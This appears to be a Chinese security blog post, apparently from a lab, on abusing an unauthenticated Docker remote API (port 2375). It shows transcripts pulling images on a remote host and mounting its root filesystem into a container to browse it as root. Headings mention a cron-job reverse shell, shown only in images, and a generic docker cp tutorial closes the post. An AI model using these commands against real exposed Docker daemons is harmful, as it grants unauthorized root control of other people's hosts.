---
title: Docker远程未授权连接
published: 2024-10-30 09:05
tags: [安全, Docker, 未授权访问, 容器逃逸]
category: 网安
draft: false
---

# Docker远程未授权连接

## 远程查看镜像

![](/images/posts/docker-unauth/1.jpg)

## 挂载目录到宿主机，写入定时任务反弹shell

![](/images/posts/docker-unauth/2.jpg)

![](/images/posts/docker-unauth/3.jpg)

## 获取宿主机权限

![](/images/posts/docker-unauth/4.jpg)

## PS：远程控制

```assembly
C:\Users\q1303>docker -H tcp://10.1.239.160:2375 pull alpine
Using default tag: latest
latest: Pulling from library/alpine
1f3e46996e29: Pull complete
Digest: sha256:56fa17d2a7e7f168a043a2712e63aed1f8543aeafdcee47c58dcffe38ed51099
Status: Downloaded newer image for alpine:latest
docker.io/library/alpine:latest

C:\Users\q1303>docker -H tcp://10.1.239.160:2375 images
REPOSITORY                      TAG       IMAGE ID       CREATED       SIZE
alpine                          latest    b0c9d60fc5e3   11 days ago   7.83MB
vulfocus/vulfocus               latest    8e55f85571c8   2 years ago   1.17GB
vulfocus/minio-cve_2021_21287   latest    0df28b7c9ea0   3 years ago   185MB
```

```assembly
C:\Users\q1303>docker -H tcp://10.1.239.160:2375 run -v /:/mnt -it alpine
/ # whoami
root
/ # ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:02
          inet addr:172.17.0.2  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:37 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:5370 (5.2 KiB)  TX bytes:0 (0.0 B)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
C:\Users\q1303>docker -H tcp://10.1.239.160:2375 run -v /:/mnt -it alpine
/ # whoami
root
/ # cd /mnt
/mnt # ls
bin         dev         lib         libx32      mnt         root        snap        sys         var
boot        etc         lib32       lost+found  opt         run         srv         tmp
cdrom       home        lib64       media       proc        sbin        swapfile    usr
/mnt # cd home
/mnt/home # ls
dcj
/mnt/home # cd dcj
/mnt/home/dcj # ls
Clash.Verge_2.0.3-alpha_amd64.deb  Public                             glibc-all-in-one
Desktop                            Pwngdb                             install.sh
Documents                          Templates                          pwndbg
Downloads                          Videos                             snap
Music                              crack
Pictures                           docker-desktop-amd64.deb
/mnt/home/dcj # cd /root
~ # ls
~ # pwd
/root
~ #
```

## docker传输文件

要将文件从 Docker 容器复制到本地，可以使用 `docker cp` 命令。以下是具体操作：
```bash
# 容器 ➡️ 本地的操作
# 格式
docker cp <容器名或ID>:<容器内文件路径> <本地目标路径>

# 示例：将容器的 /app/data.log 复制到当前目录
docker cp my_container:/app/data.log .

# 本地 ➡️ 容器的操作（反向操作）
# 格式
docker cp <本地文件路径> <容器名或ID>:<容器内目标路径>

# 示例：将本地的 config.yml 复制到容器的 /app 目录
docker cp config.yml my_container:/app/

```
### 实用技巧：

1. 先用 `docker ps` 查看容器名称/ID
2. 使用 `-a` 参数可操作已停止的容器
3. 推荐使用 volume 挂载实现持久化文件同步（更高效）：

```bash
docker run -v /本地/路径:/容器/路径 ...
```

### 常见问题排查：

- 文件权限问题 → 尝试在命令前加 `sudo`
- "No such container" → 检查容器名称是否正确
- 路径错误 → 先在容器内用 `docker exec -it 容器名 ls 路径` 确认路径存在